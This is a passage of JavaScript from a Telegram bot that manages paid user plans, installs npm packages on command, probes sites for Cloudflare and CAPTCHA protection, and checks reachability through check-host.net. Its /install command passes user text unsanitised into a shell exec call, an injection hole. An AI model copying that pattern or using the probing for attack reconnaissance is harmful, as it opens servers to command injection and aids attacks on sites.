        planList += `<pre>${JSON.stringify(planInfo, null, 2)}</pre>\n`;
    });

    bot.sendMessage(chatId, planList, { parse_mode: "HTML" });
});

// Auto-remove expired users every 60 seconds
setInterval(() => {
    let plansData = loadJSON('plans.json');
    const updatedPlans = plansData.filter(plan => Date.now() < plan.expiry);

    if (updatedPlans.length !== plansData.length) {
        saveJSON('plans.json', updatedPlans);
        console.log('Expired users have been removed.');
    }
}, 60 * 1000);

setInterval(() => {
    let plansData = loadJSON('plans.json');
    const updatedPlans = plansData.filter(plan => Date.now() < plan.expiry);

    if (updatedPlans.length !== plansData.length) {
        saveJSON('plans.json', updatedPlans);
        console.log('Expired users have been removed.');
    }
}, 60 * 1000);

//command /install
bot.onText(/\/install(?:\s+(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!adminIds.includes(userId)) {
        return bot.sendMessage(chatId, '❌ <b>You do not have permission to execute this command.</b>', { parse_mode: 'HTML' });
    }

    const moduleName = match[1] ? match[1].trim() : null;
    if (!moduleName) {
        return bot.sendMessage(chatId, '⚠️ <b>Usage:</b> <code>/install package-name</code>', { parse_mode: 'HTML' });
    }

    bot.sendMessage(chatId, `⏳ Installing module: <code>${moduleName}</code>...`, { parse_mode: 'HTML' });

    exec(`npm install ${moduleName}`, (error, stdout, stderr) => {
        if (error) {
            return bot.sendMessage(chatId, `❌ <b>Failed to install module:</b> <code>${moduleName}</code>\n🛑 Error: <pre>${error.message}</pre>`, { parse_mode: 'HTML' });
        }

        if (stderr) {
            return bot.sendMessage(chatId, `⚠️ <b>Warning:</b>\n<pre>${stderr}</pre>`, { parse_mode: 'HTML' });
        }

        bot.sendMessage(chatId, `✅ <b>Successfully installed:</b> <code>${moduleName}</code>\n\n🔄 <i>Restart the bot if necessary.</i>`, { parse_mode: 'HTML' });
    });
});

bot.onText(/\/detect (https?:\/\/[^\s]+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const target = match[1];

    bot.sendMessage(chatId, `🔍 Checking protection on ${target}, please wait...`);

    try {
        const start = Date.now();
        const response = await axios.get(target, {
            httpsAgent: new https.Agent({ rejectUnauthorized: false }),
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
            }
        });
        const end = Date.now();

        const responseTime = (end - start).toFixed(2);
        const headers = response.headers;
        const statusCode = response.status;

        let result = `🔍 <b>Protection Detection Results for:</b> <code>${target}</code>\n\n`;

        if (headers['server'] && headers['server'].includes('cloudflare')) {
            result += `✅ <b>Cloudflare</b>\n`;
        }

        if (statusCode === 403) {
            result += `🌍 <b>Geo-blocking Detected (403 Forbidden)</b>\n`;
        }

        if (headers['cf-challenge'] || headers['cf-ray']) {
            result += `🛡️ <b>CAPTCHA Protection Detected</b>\n`;
        }

        const cert = await getSSLCertificate(target);
        if (cert) {
            result += `🔐 <b>SSL/TLS Enabled</b> - Issued by: <code>${cert}</code>\n`;
        }

        result += `⏳ <b>Response Time:</b> ${responseTime} ms`;

        bot.sendMessage(chatId, result, { parse_mode: "HTML" });

    } catch (error) {
        bot.sendMessage(chatId, `❌ Failed to detect protection for: ${target}`, { parse_mode: "HTML" });
    }
});

bot.onText(/\/http (.+)/, async (msg, match) => {  
    const chatId = msg.chat.id;  
    const url = match[1];  
  
    bot.sendMessage(chatId, `🔍 <b>Starting HTTP check for:</b> <code>${url}</code>`, { parse_mode: "HTML" });  
  
    try {  
        let response = await axios.get(`https://check-host.net/check-http?host=${url}`, {  
            headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" }  
        });  
  
        let requestId = response.data.request_id;  
        await new Promise(resolve => setTimeout(resolve, 8000));  
  
        let result = await axios.get(`https://check-host.net/check-result/${requestId}`);  
        let results = result.data;  
  
        if (!results || Object.keys(results).length === 0) {  
            bot.sendMessage(chatId, "❌ <b>Failed to retrieve results.</b>", { parse_mode: "HTML" });  
            return;  
        }  
  
        let message = `📊 <b>HTTP-Check Results:</b> <code>${url}</code>\n\n`;  
  
        for (let location in results) {  
            let data = results[location];  
  
            if (data && data[0]) {  
                let timeTaken = data[0][0] ? data[0][0].toFixed(2) + "s" : "-";  
                let statusCode = data[0][2] || "-";  
                let statusMessage = data[0][1] || "Unknown";  
  
                message += `🛑 ${timeTaken} | ${statusCode} | ${statusMessage}\n`;  
            }  
        }  
  
        message += `\n\n🔗 <b>Complete Check Results:</b> <a href="https://check-host.net/check-result/${requestId}">Click here</a>`;  
  
        bot.sendMessage(chatId, `<pre>${message}</pre>`, { parse_mode: "HTML", disable_web_page_preview: true });  
  
    } catch (error) {  
        bot.sendMessage(chatId, `❌ <b>Error:</b> ${error.message}`, { parse_mode: "HTML" });  
    }  
});